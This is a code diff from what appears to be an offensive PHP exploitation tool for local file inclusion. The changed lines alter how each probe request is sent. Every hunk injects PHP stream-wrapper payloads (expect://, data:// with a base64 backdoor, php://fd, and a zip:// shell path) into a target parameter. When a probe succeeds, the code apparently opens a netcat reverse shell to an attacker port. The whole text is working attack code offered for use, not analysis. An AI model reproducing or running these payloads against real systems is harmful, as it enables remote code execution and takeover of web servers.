@@ -214,7 +214,7 @@ class CE extends PARAM4COM{
         $cmd_exec = "expect://%CMD%";
         $template = str_replace("$this->param=$this->value", "$this->param=$cmd_exec", $this->url);
         $url = $this->param2url($template, $cmd);
-        if (!empty($this->url2search($this->user2agent,$url,$filter))) {
+        if (!empty($this->url2html("", $this->url2wget("", "", $url, "GET")))) {
             $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
         }
         
@@ -222,7 +222,7 @@ class CE extends PARAM4COM{
         $cmd_exec = "expect://%CMD%%NB%";
         $template = str_replace("$this->param=$this->value", "$this->param=$cmd_exec", $this->url);
         $url = $this->param2url($template, $cmd);
-        if (!empty($this->url2search($this->user2agent,$url,$filter))) {
+        if (!empty($this->url2html("", $this->url2wget("", "", $url, "GET")))) {
             $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
         }
         
@@ -422,7 +422,7 @@ lfi.php?page=zip://var/www/upload/images/shell.zip%23shell.php
         $cmd_exec = "data://text/plain,$backdoor&cmd=%CMD%";
         $template = str_replace("$this->param=$this->value", "$this->param=$cmd_exec", $this->url);
         $url = $this->param2url($template, $cmd);
-        if (!empty($this->url2search($this->user2agent,$url,$filter))) {
+        if (!empty($this->url2html("", $this->url2wget("", "", $url, "GET")))) {
             $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
         }
         
@@ -432,7 +432,7 @@ lfi.php?page=zip://var/www/upload/images/shell.zip%23shell.php
         $cmd_exec = "data:,$backdoor&cmd=%CMD%%NB%";
         $template = str_replace("$this->param=$this->value", "$this->param=$cmd_exec", $this->url);
         $url = $this->param2url($template, $cmd);
-        if (!empty($this->url2search($this->user2agent,$url,$filter))) {
+        if (!empty($this->url2html("", $this->url2wget("", "", $url, "GET")))) {
             $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
         }
         
@@ -443,7 +443,7 @@ lfi.php?page=zip://var/www/upload/images/shell.zip%23shell.php
         $cmd_exec = "data:;base64,$backdoor_base64"."&cmd=%CMD%";
         $template = str_replace("$this->param=$this->value", "$this->param=$cmd_exec", $this->url);
         $url = $this->param2url($template, $cmd);
-        if (!empty($this->url2search($this->user2agent,$url,$filter))) {
+        if (!empty($this->url2html("", $this->url2wget("", "", $url, "GET")))) {
             $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
         }
         
@@ -453,7 +453,7 @@ lfi.php?page=zip://var/www/upload/images/shell.zip%23shell.php
         $cmd_exec = "data:application/x-httpd-php;base64,$backdoor_base64&cmd=%CMD%";
         $template = str_replace("$this->param=$this->value", "$this->param=$cmd_exec", $this->url);
         $url = $this->param2url($template, $cmd);
-        if (!empty($this->url2search($this->user2agent,$url,$filter))) {
+        if (!empty($this->url2html("", $this->url2wget("", "", $url, "GET")))) {
             $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
         }
         
@@ -464,7 +464,7 @@ lfi.php?page=zip://var/www/upload/images/shell.zip%23shell.php
         $cmd_exec = "data://text/plain;base64,$backdoor_base64&cmd=%CMD%";
         $template = str_replace("$this->param=$this->value", "$this->param=$cmd_exec", $this->url);
         $url = $this->param2url($template, $cmd);
-        if (!empty($this->url2search($this->user2agent,$url,$filter))) {
+        if (!empty($this->url2html("", $this->url2wget("", "", $url, "GET")))) {
             $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
         }
         $this->pause();
@@ -473,7 +473,7 @@ lfi.php?page=zip://var/www/upload/images/shell.zip%23shell.php
         $cmd_exec = "data://text/plain;$backdoor&cmd=%CMD%";
         $template = str_replace("$this->param=$this->value", "$this->param=$cmd_exec", $this->url);
         $url = $this->param2url($template, $cmd);
-        if (!empty($this->url2search($this->user2agent,$url,$filter))) {
+        if (!empty($this->url2html("", $this->url2wget("", "", $url, "GET")))) {
             $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
         }
         
@@ -502,7 +502,7 @@ lfi.php?page=zip://var/www/upload/images/shell.zip%23shell.php
         $cmd_exec = "php://fd/&cmd=%CMD%";
         $template = str_replace("$this->param=$this->value", "$this->param=$cmd_exec", $this->url);
         $url = $this->param2url($template, $cmd);
-        if (!empty($this->url2search($this->user2agent,$url,$filter))) {
+        if (!empty($this->url2html("", $this->url2wget("", "", $url, "GET")))) {
             $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
         }
     }
